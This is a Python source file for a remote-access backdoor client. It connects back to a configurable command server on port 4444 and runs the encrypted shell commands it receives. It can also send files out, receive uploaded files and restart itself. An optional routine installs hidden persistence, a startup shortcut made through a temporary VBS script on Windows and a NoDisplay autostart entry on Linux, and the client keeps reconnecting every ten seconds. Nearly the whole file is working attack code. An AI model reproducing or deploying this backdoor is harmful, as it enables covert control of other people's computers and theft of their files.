import socket
import subprocess
import time
import sys
import os
from crypto_utils import encrypt_message, decrypt_message, generate_key


# ================= CONFIGURATION =================
# Set to True if you want the script to add itself to startup folder on first run
ADD_TO_STARTUP_FOLDER = False

HOME_DIR = os.path.expanduser('~')

if os.name == 'nt':
    KEY_PATH = os.path.join(HOME_DIR, 'Documents', 'secret.key')
else:
    KEY_PATH = os.path.join(HOME_DIR, '.secret.key')

# Edit tis variable to needed IP or domain of server
server_host = '127.0.0.1' 
# =================================================
 

def request_key(host=server_host):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, 4444))
    client.send(b'REQUEST_KEY')
    key = client.recv(1024)
    with open(KEY_PATH, 'wb') as f:
        f.write(key)
    client.send(b'KEY_RECEIVED')
    client.close()
    return key

try:
    with open(KEY_PATH, 'rb') as f:
        KEY = f.read().strip()
except FileNotFoundError:
    KEY = request_key()
    
def send_result(client, key, result: bytes):

    encrypted_result = encrypt_message(key, result)

    result_len = len(encrypted_result)
    client.send(f"{result_len:<64}".encode('utf-8'))

    ack = client.recv(1024) 
    if ack == b"OK_SIZE":
        client.sendall(encrypted_result)


def add_to_startup(name='Application'):
    if os.name == 'nt':
        startup_dir = os.path.join(os.environ['USERPROFILE'], r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
        shortcut_path = os.path.join(startup_dir, f'{name}.lnk')

        if os.path.exists(shortcut_path):
            return True
        
        if getattr(sys, 'frozen', False):
            target = sys.executable
            arguments = ""
        else:
            target = sys.executable

            script_path = os.path.abspath(sys.argv[0])
            arguments = f'""{script_path}""' 

        try:
            vbs_script = (
                'Set oWS = WScript.CreateObject("WScript.Shell")\n'
                f'Set oLink = oWS.CreateShortcut("{shortcut_path}")\n'
                f'oLink.TargetPath = "{target}"\n'
                f'oLink.Arguments = "{arguments}"\n'
                'oLink.Save()'
            )
            vbs_path = os.path.join(os.environ["TEMP"], "create_shortcut.vbs")
            
            with open(vbs_path, "w", encoding="cp1251") as f:
                f.write(vbs_script)
                
            subprocess.run(f'cscript //nologo "{vbs_path}"', shell=True, capture_output=True)
            
            if os.path.exists(vbs_path):
                os.remove(vbs_path)
            return True
        except Exception:
            return False
    else:
        try:
            autostart_dir = os.path.expanduser('~/.config/autostart')
            os.makedirs(autostart_dir, exist_ok=True)

            desktop_entry_path = os.path.join(autostart_dir, f'{name}.desktop')

            if os.path.exists(desktop_entry_path):
                return True
            if getattr(sys, 'frozen', False):
                exec_command = sys.executable
            else:
                exec_command = f'{sys.executable} "{os.path.abspath(sys.argv[0])}"'

            desktop_file_content = (
                    "[Desktop Entry]\n"
                    "Type=Application\n"
                    f"Name={name}\n"
                    f"Exec={exec_command}\n"
                    "Terminal=false\n"
                    "NoDisplay=true\n"
                    "X-GNOME-Autostart-enabled=true\n"
                )

            with open(desktop_entry_path, 'w', encoding='utf-8') as f:
                f.write(desktop_file_content)

            return True
        except:
            return False

def client_listen(host=server_host):
    should_exit = False

    while not should_exit:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((host, 4444)) 
              
            if os.path.exists(KEY_PATH):
                client.send(b'HELLO')
            else:
                client.send(b'REQUEST_KEY')

            while True:
                try:
                    raw_data = client.recv(4096)
                    if not raw_data:
                        break
                        
                    cmd_bytes = decrypt_message(KEY, raw_data)
                    cmd = cmd_bytes.decode('utf-8', errors='ignore')

                    if cmd.strip() == '':
                        continue

                    if cmd.lower() == 'exit':
                        client.close()
                        should_exit = True
                        break

                    if cmd.lower() == 'restart' or cmd.lower() == 'res':
                        send_result(client, KEY, b"[+] Restarting...")
                        try:
                            client.shutdown(socket.SHUT_RDWR)
                            client.close()
                        except:
                            pass

                        if getattr(sys, 'frozen', False):
                            args = [sys.executable]
                        else:
                            script_path = os.path.abspath(sys.argv[0])
                            args = [sys.executable, script_path]

                        subprocess.Popen(
                            args, 
                            close_fds=True, 
                            creationflags=subprocess.CREATE_NEW_CONSOLE if not getattr(sys, 'frozen', False) else 0
                            )

                        os._exit(0)


                    if cmd.lower() == 'cd':
                        result = f"[+] Current directory: {os.getcwd()}\n".encode('utf-8')
                        send_result(client, KEY, result)
                        
                    elif cmd.lower().startswith('cd '):
                        try:
                            path = cmd[3:].strip()
                            os.chdir(path) 
                            result = f"[+] Directory changed: {os.getcwd()}\n".encode('utf-8')
                        except Exception as e:
                            result = f"[!] Error to change directory: {str(e)}\n".encode('utf-8')

                        send_result(client, KEY, result)

                    elif cmd.lower().startswith('download '):
                        try:
                            file_path = cmd[9:].strip()
                            if os.path.exists(file_path) and os.path.isfile(file_path):
                                with open(file_path, 'rb') as f:
                                    file_bytes = f.read()
                                send_result(client, KEY, file_bytes)
                            else:
                                send_result(client, KEY, b"[!] Error: File not found or is a directory\n")
                        except Exception as e:
                            send_result(client, KEY, f"[!] Download error: {str(e)}\n".encode('utf-8'))

                    elif cmd.lower().startswith('upload '):
                        try:
                            size_header = client.recv(64).decode('utf-8').strip()
                            if size_header:
                                data_size = int(size_header)
                                client.send(b"OK_SIZE")
                                
                                encrypted_file = b''
                                while len(encrypted_file) < data_size:
                                    chunk = client.recv(min(4096, data_size - len(encrypted_file)))
                                    if not chunk:
                                        break
                                    encrypted_file += chunk
                                
                                decrypted_data = decrypt_message(KEY, encrypted_file)
                                file_path = cmd[7:].strip()
                                
                                with open(file_path, 'wb') as f:
                                    f.write(decrypted_data)
                                
                                send_result(client, KEY, b"[+] File uploaded successfully\n")
                            else:
                                send_result(client, KEY, b"[!] Error: Failed to receive file size\n")
                        except Exception as e:
                            send_result(client, KEY, f"[!] Upload error: {str(e)}\n".encode('utf-8'))

                    else:
                        try:
                            output = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                            result = output.stdout + output.stderr
                            if not result:
                                result = b'[+] Done\n'

                        except subprocess.TimeoutExpired:
                            result = '[!] Error: Command execution timeout exceeded \n'.encode('utf-8')

                        except Exception as e:
                            result = f'[!] Error execute command: {str(e)}\n'.encode('utf-8')

                        send_result(client, KEY, result)

                except Exception:
                    break

        except (socket.error, ConnectionRefusedError):
            time.sleep(10)
            continue
   
    try:
        client.close()
    except:
        pass

if __name__ == '__main__':
    if ADD_TO_STARTUP_FOLDER:
        add_to_startup('Application')

    KEY = None
    while KEY is None:
        try:
            with open(KEY_PATH, 'rb') as f:
                KEY = f.read().strip()
        except FileNotFoundError:
            try:
                KEY = request_key()
            except (socket.error, ConnectionRefusedError):
                time.sleep(10)

    client_listen()
